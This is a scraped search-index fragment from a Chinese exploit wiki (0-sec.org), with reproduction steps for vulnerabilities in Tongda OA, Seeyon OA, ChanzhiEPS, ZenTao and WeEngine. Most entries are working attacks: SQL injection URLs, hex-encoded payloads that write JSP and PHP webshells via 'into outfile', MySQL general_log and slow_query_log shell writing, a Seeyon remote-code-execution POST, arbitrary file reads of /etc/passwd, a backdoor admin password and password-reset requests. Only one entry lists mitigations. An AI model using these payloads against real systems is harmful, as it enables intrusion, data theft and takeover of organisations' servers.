console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/10.html":{"url":"0day/通达oa/10.html","title":"通达oa 数据库脚本导⼊getshell","keywords":"","body":"通达oa 数据库脚本导⼊getshell 一、漏洞简介 二、漏洞影响 2013、2015版本 三、复现过程 ⾥面的database⻚面可以导入sql脚本文件,但是系统过滤了很多,有很多的限制,使⽤mysql日志的方式进行 突破。 set global general_log = on; set global general_log_file = '../webroot/test.php'; select ''; set global general_log = off; 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-04 22:36:58 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/11.html":{"url":"0day/通达oa/11.html","title":"通达oa 任意⽂件上传漏洞","keywords":"","body":"通达oa 任意⽂件上传漏洞 一、漏洞简介 二、漏洞影响 2013、2015版本 三、复现过程 EXP: 上传jpg之后shell地址为 http://0-sec.org/general/vmeet/wbUpload/test.php 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-04 22:39:11 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/1.html":{"url":"0day/通达oa/1.html","title":"通达oa 11.2后台getshell","keywords":"","body":"通达OA 11.2 后台getshell 一、漏洞简介 二、漏洞影响 三、复现过程 系统管理-附件管理-添加存储目录 设置存储目录 （一般默认网站安装目录为 D:/MYOA/webroot/ 最后也有路径获取的地方，如果不设置会不在网站根目录下，无法直接访问附件） 寻找附件上传 通过.php. 绕过黑名单上传 根据返回结果拼接上传路径：/im/1912/383971046.test.php 直接访问（im是模块） 最后这有绝对路径的获取 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-22 00:09:27 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/致远oa/6.html":{"url":"0day/致远oa/6.html","title":"致远OA Session泄漏漏洞","keywords":"","body":"致远OA Session泄漏漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞位置: http://www.0-sec.org/yyoa/ext/https/getSessionList.jsp 漏洞详情: 当cmd参数为getAll时，便可获取到所有用户的SessionID利用泄露的SessionID即可登录该用户，包括管理员 请求方式: Get POC: http://www.0-sec.org/yyoa/ext/https/getSessionList.jsp?cmd=getAll 回显内容 weiph 9EA4F8832FA1C9BA99E3D13E2F01CAF7zhaozy F9244E7F1B8C39BB8919FAE8E19ED16A 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-20 13:41:58 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/致远oa/2.html":{"url":"0day/致远oa/2.html","title":"致远OA A6 test.jsp sql注入漏洞","keywords":"","body":"致远OA A6 test.jsp sql注入漏洞 一、漏洞简介 致远A6协同系统 /yyoa/common/js/menu/test.jsp 文件 S1 参数SQL注入漏洞 二、漏洞影响 致远OA A6 三、复现过程 注入点为S1变量，通过探测，发现是mysql数据库 http://www.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&S1= 于是构造注入语句查询数据库名： http://www.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database()) Mysql注入中，我们使用into outfile 来写入数据，用此方法注入webshell，前提条件两个： 1：root权限 2：物理路径 我们探测一下web根目录 http://www.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir) 通过yyoa目录结构猜测物理路径为 F:/UFseeyon/OA/tomcat/webapps/yyoa/ 可以使用load_file判断是否正确 http://www.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20load_file(%27F:/UFseeyon/OA/tomcat/webapps/yyoa/WEB-INF/web.xml%27) 利用mysql into outfile写shell：由于jsp一句话超长，请求连接会拒绝，故先上传写文件脚本，再本地构造进行webshell上传： 由于特殊符号存在，URL编码会造成写入后代码错误，故采用hex编码后unhex处理上传，写入文件名为：he1p.jsp http://www.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27F:/UFseeyon/OA/tomcat/webapps/yyoa/he1p.jsp%27 本地构造上传： your code 上传后获取webshell地址为：http://www.0-sec.org/yyoa/we1come.jsp 参考链接 https://www.pa55w0rd.online/yyoa/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-20 13:43:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/致远oa/3.html":{"url":"0day/致远oa/3.html","title":"致远OA A6 search_result.jsp sql注入漏洞","keywords":"","body":"致远OA A6 search_result.jsp sql注入漏洞 一、漏洞简介 二、漏洞影响 致远OA A6 三、复现过程 漏洞位置: /yyoa/oaSearch/search_result.jsp 漏洞详情: 版本：A6 注意：需登录账户 注入发生在search_result.jsp文件中的docTitle参数 请求方式: Get POC: http://www.0-sec.org/yyoa/oaSearch/search_result.jsp?docType=协同信息&docTitle=1'and/**/1=2/**/ union/**/all/**/select/**/user(),2,3,4,5%23&goal=1&perId=0&startTime=&endTime=&keyword=&searchArea=notArc 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-20 13:15:25 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/致远oa/7.html":{"url":"0day/致远oa/7.html","title":"致远OA A6 setextno.jsp sql注入漏洞","keywords":"","body":"致远OA A6 setextno.jsp sql注入漏洞 一、漏洞简介 用友致远A6协同系统SQL注入，union可shell 二、漏洞影响 致远OA A6 三、复现过程 漏洞位置: http://www.0-sec.org/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp 漏洞详情: 版本：A6用友致远A6协同系统SQL注入，union可shell 请求方式: Get POC: http://www.0-sec.org/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17) union all select 1,2,@@version,user()%23 回显内容 5.0.41-community-nt 分机号root@localhost 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-20 13:42:44 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/致远oa/4.html":{"url":"0day/致远oa/4.html","title":"致远OA A6 重置数据库账号密码漏洞","keywords":"","body":"致远OA A6 重置数据库账号密码漏洞 一、漏洞简介 二、漏洞影响 致远OA A6 三、复现过程 重置数据库账号密码防御 http://www.0-sec.org/yyoa/ext/byoa/start.jsp 该文件的代码为： 可以抛光该文件没有验证任何权限，便进行了重置数据库用户byoa的密码为：byoa mysql + jsp注射 http://www.0-sec.org/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp poc http://www.0-sec.org/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids=(17) union all select user()%23{'success':false,'errors':'root@localhost'} 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-20 13:23:32 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/致远oa/5.html":{"url":"0day/致远oa/5.html","title":"致远OA A6 敏感信息泄露（一）","keywords":"","body":"致远OA A6 敏感信息泄露（一） 一、漏洞简介 该漏洞泄露了数据库用户的账号，密码hash。访问该文件直接执行了Select * from mysql.user;并回显 二、漏洞影响 致远OA A6 三、复现过程 漏洞位置: http://www.0-sec.org/yyoa/createMysql.jsp http://www.0-sec.org/yyoa/ext/createMysql.jsp 回显内容： root *1532B21FE550E115F113DAA9A26D0EEEEF8DEDC7 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-20 13:46:18 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/致远oa/8.html":{"url":"0day/致远oa/8.html","title":"致远OA A6 敏感信息泄露（二）","keywords":"","body":"致远OA A6 敏感信息泄露（二） 一、漏洞简介 二、漏洞影响 致远OA A6 三、复现过程 漏洞位置: http://www.0-sec.org/yyoa/DownExcelBeanServlet 漏洞详情: 版本:A6只有系统管理才有的权限，但是任意用户都可以访问。可以下载所有员工的个人信息，包括身份证、联系方式、职位等敏感信息。 请求方式: Get POC: http://www.0-sec.org/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-20 13:48:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/致远oa/14.html":{"url":"0day/致远oa/14.html","title":"致远OA A8 未授权访问","keywords":"","body":"致远OA A8 未授权访问 一、漏洞简介 二、漏洞影响 致远OA A8 三、复现过程 该地址为性能监控后台，存在未授权访问 seeyon/management/status.jsp 任意文件读取漏洞,由于对filename未进行过滤，导致可下载读取任意文件 http://www.0-sec.org/seeyon/main.do?method=officeDown&filename=c:/boot.ini 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-20 14:28:11 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/致远oa/9.html":{"url":"0day/致远oa/9.html","title":"致远OA A8 任意用户密码修改漏洞","keywords":"","body":"致远OA A8 任意用户密码修改漏洞 一、漏洞简介 二、漏洞影响 致远OA A8 三、复现过程 http://www.0-sec.org/seeyon/services/authorityService?wsdl 通过调试接口的默认用户 userName:service-admin password:123456 获取万能Token之后可以修改任意用户密码。 访问 http://www.0-sec.org/seeyon/getAjaxDataServlet?S=ajaxOrgManager&M=isOldPasswordCorrect&CL=true&RVT=XML&P_1_String=zw&P_2_String=wooyun 返回false 说明zw密码不正确 修改密码 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-20 14:14:45 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/致远oa/1.html":{"url":"0day/致远oa/1.html","title":"致远OA A8 系统远程命令执行漏洞","keywords":"","body":"致远OA A8 系统远程命令执行漏洞 一、漏洞简介 该系统的漏洞点在于致远OA-A8系统的Servlet接口暴露，安全过滤处理措施不足，使得用户在无需认证的情况下实现任意文件上传。攻击者利用该漏洞，可在未授权的情况下，远程发送精心构造的网站后门文件，从而获取目标服务器权限，在目标服务器上执行任意代码。 二、漏洞影响 漏洞影响的产品版本包括： 致远A8-V5协同管理软件 V6.1sp1 致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3 致远A8+协同管理软件V7.1 漏洞处置建议 临时修补方案如下： 1、 配置URL访问控制策略； 2、 在公网部署的致远A8+服务器，通过ACL禁止外网对“/seeyon/htmlofficeservlet”路径的访问； 3、 对OA服务器上的网站后门文件进行及时查杀。 建议使用致远OA-A8系统的信息系统运营者进行自查，发现存在漏洞后，按照以上方案及时修复。 详情请移步CNVD官网查看https://www.cnvd.org.cn/webinfo/show/5095 三、复现过程 先访问/seeyon/htmlofficeservlet 出现DBSTEP V3.0 0 21 0 htmoffice operate err 掏出burp进行抓包替换成poc如下 提交POST请求包，查看回显如下 小结 POC：(POST包) POST /seeyon/htmlofficeservlet HTTP/1.1 Content-Length: 1121 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Host: xxxxxxxxx Pragma: no-cache DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 \"+excuteCmd(request.getParameter(\"cmd\")) + \"\");}else{out.println(\":-)\");}%>6e4f045d4b8506bf492ada7e3390d7ce 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-20 13:00:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/致远oa/10.html":{"url":"0day/致远oa/10.html","title":"致远OA A8-m 后台万能密码","keywords":"","body":"致远OA A8-m 后台万能密码 一、漏洞简介 二、漏洞影响 致远OA A8-m 三、复现过程 密码： WLCCYBD@SEEYON 登陆地址： http://www.0-sec.org/seeyon/management/status.jsp 成功之后 输入 login 查看登录日志 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-20 14:15:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/致远oa/11.html":{"url":"0day/致远oa/11.html","title":"致远OA A8-m 存在sql语句页面回显功能","keywords":"","body":"致远OA A8-m 存在sql语句页面回显功能 一、漏洞简介 二、漏洞影响 致远OA A8-m 三、复现过程 http://wwww.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20@@datadir 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-20 14:18:37 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/致远oa/12.html":{"url":"0day/致远oa/12.html","title":"致远OA A8-v5 无视验证码撞库","keywords":"","body":"致远OA A8-v5 无视验证码撞库 一、漏洞简介 致远A8-V5在设计时存在逻辑错误，用户修改密码时对原密码进行了验证，但是验证使用的服务存在未授权访问漏洞，系统对非合法请求的原密码验证功能进行回应，导致了无视验证码，无需login页面进行密码尝试 二、漏洞影响 致远OA A8-v5 三、复现过程 POST穷举用户和密码代码如下 GET /seeyon/getAjaxDataServlet?S=ajaxOrgManager&M=isOldPasswordCorrect&CL=true&RVT=XML&P_1_String=admin&P_2_String=wy123456 HTTP/1.0 Accept: */* Accept-Language: zh-cn Referer: http://www.0-sec.org/seeyon/individualManager.do?method=managerFrame requesttype: AJAX Content-Type: application/x-www-form-urlencoded Cookie: User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Host: www.0-sec.org DNT: 1 Proxy-Connection: Keep-Alive 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-20 14:22:57 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/致远oa/13.html":{"url":"0day/致远oa/13.html","title":"致远OA A8-v5 任意用户密码修改","keywords":"","body":"致远OA A8-v5 任意用户密码修改 一、漏洞简介 致远A8-V5在设计时存在逻辑错误，在上一步对原始密码进行验证后，下一步不再检测原始密码，从而直接修改用户密码，导致平行权限的越权漏洞。 二、漏洞影响 致远OA A8-v5 三、复现过程 POST如下数据 POST /seeyon/individualManager.do?method=modifyIndividual HTTP/1.0 Accept: text/html, application/xhtml+xml, */* Referer: http://www.0-sec.org/seeyon/individualManager.do?method=managerFrame Accept-Language: zh-CN User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Content-Type: application/x-www-form-urlencoded Proxy-Connection: Keep-Alive Pragma: no-cache Content-Length: 86 DNT: 1 Host: www.0-sec.org Cookie: JSESSIONID=DA71A65B3AAD45823A1FADAB80A3E685; Hm_lvt_49c0fa7f96aa0a5fb95c62909d5190a6=1419221849,1419232608; avatarImageUrl=8469117046183055270; loginPageURL=\"/main.do\" individualName=admin&formerpassword=123456&nowpassword=wy123456&validatepass=wy123456 individualName为用户名 注意，此处需要以一个合法的JSESSIONID发送如上数据即可修改任意用户密码，合法的JSESSIONID由撞库得出。 本次证明演示中修改的用户为admin，修改为wy123456 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-20 14:24:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/禅知/1.html":{"url":"0day/禅知/1.html","title":"禅知Pro 1.6 前台任意文件读取","keywords":"","body":"禅知 Pro 1.6 前台任意文件读取 一、漏洞简介 二、漏洞影响 三、复现过程 在网站根目录C:\\xampp\\chanzhi\\www新建一个测试文件test.php 执行payload查看文件内容： http://0-sec.org/file.php?pathname=../test.php&t=txt&o=source 执行payload来查看程序的配置文件： http://0-sec.org/file.php?pathname=../http.ini&t=txt&o=source 跨目录读取文件（前提是有目录权限）： http://0-sec.org/file.php?pathname=../../bin/php/backup.php&t=txt&o=source 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-24 14:32:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/禅知/2.html":{"url":"0day/禅知/2.html","title":"禅知后台getshell","keywords":"","body":"禅知 后台getshell 一、漏洞简介 二、漏洞影响 三、复现过程 后台存在模板编辑，但是如果保存的话需要创建一个/system\\tmp\\xjrg.txt文件，那么我们找到一个可以创建任意文件的地方就 在/system/module/wechat/model.php $qrcodeFile未过滤目录穿越导致可以去其他地方创建文件夹通过微信设置原始ID的地方写入穿越的文件路径 POST /chanzhieps/www/admin.php?m=wechat&f=edit&publicID=1 HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Referer: http://localhost/chanzhieps/www/admin.php?m=wechat&f=edit&publicID=1 Content-Length: 120 Cookie: adminsid=ae8tu3s80j8cfvh2hkgu41bbig; adminLang=zh-cn; adminDevice=desktop; theme=default; currentGroup=setting; frontsid=eaa0tdicbqfq0lurm89t3n9fvn; frontLang=zh-cn; frontDevice=desktop X-Forwarded-For: 8.8.8.8 Connection: close type=subscribe&name=123&account=..%2F..%2F..%2Fsystem%5Ctmp%5Cxjrg.txt%5C1&appID=789&appSecret=100&token=222&certified=0 点一下二维码，再随便传一张图片，可以看到创建了一个xjrg.txt文件夹 现在我们再去编辑模板，{!echo(system('ipconfig'))},可以直接写入一句话 然后在访问前台 http:/0-sec.org/chanzhieps/www/index.php/sitemap/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-22 00:08:40 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/禅道/1.html":{"url":"0day/禅道/1.html","title":"禅道8.2-9.2.1 注入GetShell","keywords":"","body":"禅道 8.2-9.2.1 注入&getshell 一、漏洞简介 二、漏洞影响 三、复现过程 我这里用的官方集成环境版本8.4 获取版本号：/index.php?mode=getconfig 绝对路径 获取绝对路径：网址后面随便输入什么就会爆出绝对路径 没路径的报错exp： {\"orderBy\":\"order limit 1,1 PROCEDURE ANALYSE(polygon(id),1)#\",\"num\":\"1,1\",\"type\":\"openedbyme\"} base64加密： eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKHBvbHlnb24oaWQpLDEpIyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0= EXP 提交地址：http://127.0.0.1:81/zentao/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=base64 ※exp需要base64加密后才能提交，且回显、写Shell须加上Referer：http://127.0.0.1:81/zentao/ 注入显密码： {\"orderBy\":\"order limit 1;#\",\"num\":\"1,1\",\"type\":\"openedbyme\"} base64加密： eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTsjIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ== 不知道什么原因，本地复现无账号密码回显。。。 前台GetShell： {\"orderBy\":\"order limit 1;SET @SQL=0x73656C65637420273C3F70687020406576616C28245F504F53545B785D293F3E2720696E746F206F757466696C652027443A2F7A656E74616F2F78616D70702F7A656E74616F2F7777772F6861636B2E70687027;PREPARE pord FROM @SQL;EXECUTE pord;-- -\",\"num\":\"1,1\",\"type\":\"openedbyme\"} 其中有部分使用了MySQL的预处理查询绕过程序的过滤： 导出shell： select '' into outfile 'D:/zentao/xampp/zentao/www/hack.php' HEX编码：（注意加密解密都不带0x，但是EXP中需要加上） 73656C65637420273C3F70687020406576616C28245F504F53545B785D293F3E2720696E746F206F757466696C652027443A2F7A656E74616F2F78616D70702F7A656E74616F2F7777772F6861636B2E70687027 base64加密： eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2QzY1NjM3NDIwMjczQzNGNzA2ODcwMjA0MDY1NzY2MTZDMjgyNDVGNTA0RjUzNTQ1Qjc4NUQyOTNGM0UyNzIwNjk2RTc0NkYyMDZGNzU3NDY2Njk2QzY1MjAyNzQ0M0EyRjdBNjU2RTc0NjE2RjJGNzg2MTZENzA3MDJGN0E2NTZFNzQ2MTZGMkY3Nzc3NzcyRjY4NjE2MzZCMkU3MDY4NzAyNztQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ== 访问之即可在目录下生成hack.php： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-22 00:08:04 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/禅道/2.html":{"url":"0day/禅道/2.html","title":"禅道 11.6 sql注入漏洞","keywords":"","body":"禅道 11.6 sql注入漏洞 一、漏洞简介 禅道项目管理软件是一款国产的，基于LGPL协议，开源免费的项目管理软件，它集产品管理、项目管理、测试管理于一体，同时还包含了事务管理、组织管理等诸多功能，是中小型企业项目管理的首选，基于自主的PHP开发框架──ZenTaoPHP而成，第三方开发者或企业可非常方便的开发插件或者进行定制。 厂商官网：https://www.zentao.net/ 而此次发现的漏洞正是ZenTaoPHP框架中的通用代码所造成的的，因此禅道几乎所有的项目都受此漏洞影响 二、漏洞影响 禅道 11.6 禅道开源版 9版本 三、复现过程 禅道的注入在9版本当时也出现过，原理是limit后的参数采用了直接拼接，但是现在这个版本的禅道对所有的sql语句都做了转义处理，并且get参数都有严格的限制，不能出现\"()\"等特殊符号，所以说要想要通过get去注入获得数据，会显得非常困难，另外要提到的一点就是禅道很多参数都会有base64的解码，这其实也是一个比较不错的突破口，但是这里发现了一个更明显的sql注入漏洞。 漏洞代码位于module/api/model.php文件的sql函数 这里其实是由很多限制的，比如说只能用select语句，并且其中可能还不能出现“()”这样的符号，因此这里只能采用最古老的的select语句去读数据库信息，虽然简单但是十分有效。 漏洞url: http://www.0-sec.org/zentaopms_11.6/www/api-getModel-user-getRealNameAndEmails-users=admin http://www.0-sec.org/zentaopms_11.6/www/api-getModel-api-sql-sql=select+account,password+from+zt_user 这里简单说下禅道目前最新版所采用的pathinfo模式，首先通过传参确定进入的control文件为api，对应的method为getModel，接着开始对参数进行赋值，其中moduleName为api，methodName=sql，最后的param为sql=select+account,password+from+zt_user，那么调用了call_user_func_array函数后，会进入到api目录下的model文件，对应调用其中的sql函数，并通过赋值，将sql变量赋值为select+account,password+from+zt_user，最后执行query语句，造成数据库泄露。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-17 16:20:44 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/禅道/3.html":{"url":"0day/禅道/3.html","title":"禅道 11.6 任意文件读取","keywords":"","body":"禅道 11.6 任意文件读取 一、漏洞简介 禅道项目管理软件是一款国产的，基于LGPL协议，开源免费的项目管理软件，它集产品管理、项目管理、测试管理于一体，同时还包含了事务管理、组织管理等诸多功能，是中小型企业项目管理的首选，基于自主的PHP开发框架──ZenTaoPHP而成，第三方开发者或企业可非常方便的开发插件或者进行定制。 厂商官网：https://www.zentao.net/ 而此次发现的漏洞正是ZenTaoPHP框架中的通用代码所造成的的，因此禅道几乎所有的项目都受此漏洞影响 二、漏洞影响 禅道 11.6 禅道开源版 9版本 三、复现过程 漏洞代码位于module/file/model.php中的parseCSV函数 这里通过上面的思路同样可以对fileName进行赋值，最终返回读取的文件数据 漏洞poc为： http://www.0-sec.org/zentaopms_11.6/www/api-getModel-file-parseCSV-fileName=/etc/passwd 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-17 16:22:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/禅道/4.html":{"url":"0day/禅道/4.html","title":"禅道 11.6 远程命令执行漏洞","keywords":"","body":"禅道 11.6 远程命令执行漏洞 一、漏洞简介 禅道项目管理软件是一款国产的，基于LGPL协议，开源免费的项目管理软件，它集产品管理、项目管理、测试管理于一体，同时还包含了事务管理、组织管理等诸多功能，是中小型企业项目管理的首选，基于自主的PHP开发框架──ZenTaoPHP而成，第三方开发者或企业可非常方便的开发插件或者进行定制。 厂商官网：https://www.zentao.net/ 而此次发现的漏洞正是ZenTaoPHP框架中的通用代码所造成的的，因此禅道几乎所有的项目都受此漏洞影响 二、漏洞影响 禅道 11.6 禅道开源版 9版本 三、复现过程 一开始想要找的就是rce漏洞，所以通过寻找rce漏洞找到了禅道框架的漏洞，也是一个比较意外的收获吧。这里想要rce其实是文件写入+文件包含组合getshell的，所以只要我们都能够在model文件中找到这两类功能函数就能够达到我们的目的，另外这里可能有人会提出疑问，都能够写文件了，难道不能直接getshell嘛？这里写入的文件名没有经过base64解密，前面也说了禅道对于GET的参数其实是有多重限制的，像“.”也明显不在白名单规则里，所以最终放弃了这条路。 首先是文件写入漏洞，漏洞代码在module/editor/model.php中的save函数 这里对文件写入内容作了一定黑名单的限制，这个绕过比较简单就不多说了，懂的人都懂，另外会对filePath做可写限制，因此这里如果是linux服务器部署的话，推荐写在/tmp目录下，毕竟没有什么限制，而且物理路径比较可控，如果想要../来跳转目录写入，这个是会失败的。 文件包含这个点是在module/api/model.php的getMethod函数 这里传入filePath，最终经过了helper::import函数，这个函数跟进就会发现其实就是import函数，那么回到上面的代码，这里filePath就是我们写入的文件名，但是需要注意的是这里包含的是filePath的dirname，也就是说直接输入文件路径，最终包含的文件路径的上一级目录名，因此这里需要加上一层路径。 最终poc如下，需要给物理路径加上一层才能包含成功。 http://www.0-sec.org/zentaopms_11.6/www/api-getModel-api-getMethod-filePath=/tmp/123/1 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-17 16:25:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/微擎/1.html":{"url":"0day/微擎/1.html","title":"微擎 后台绕过禁用函数写shell","keywords":"","body":"微擎cms 后台绕过禁用函数写shell 一、漏洞简介 二、漏洞影响 三、复现过程 1.站点设置里面打开调试 2.执行语句 select into被禁止 3.利用日志文件写shell show variables like '%general%'; #查看配置 set global general_log = on; #开启general log模式 set global general_log_file = '/var/www/html/1.php'; #设置日志目录为shell地址 select '' #写入shell 4.SQL查询免杀shell的语句 SELECT \"'a','pffff'=>'s','e'=>'fffff','lfaaaa'=>'r','nnnnn'=>'t');$ 补充:来自土司@GuoKerSb的分享 在无法修改general_log_file指向的地址且网站用户量多时刻处于查询的状态，我们还可以通过启动slow_query_log（慢查询日志，默认关闭）来写shell set global slow_query_log=1; set global slow_query_log_file='/var/www/html/1.php'; select '' or sleep(11); 四、参考链接 https://www.vulnbug.com/Exploit/Microcomputer-CMS-bypasses-disabled-Intooutfile-and-safe-dog.html 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-17 14:57:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/微擎/3.html":{"url":"0day/微擎/3.html","title":"微擎 低权限后台getshell","keywords":"","body":"微擎 低权限后台getshell 一、漏洞简介 二、漏洞影响 三、复现过程 /web/index.php?c=site&a=editor 这个文件可以编辑html，然后前台会解析成php 没测试最新版 比如编辑专题：/web/index.php?c=site&a=editor&do=page&multiid=0 上架抓包 改html内容为php 复制前台url 访问之 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 19:02:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && 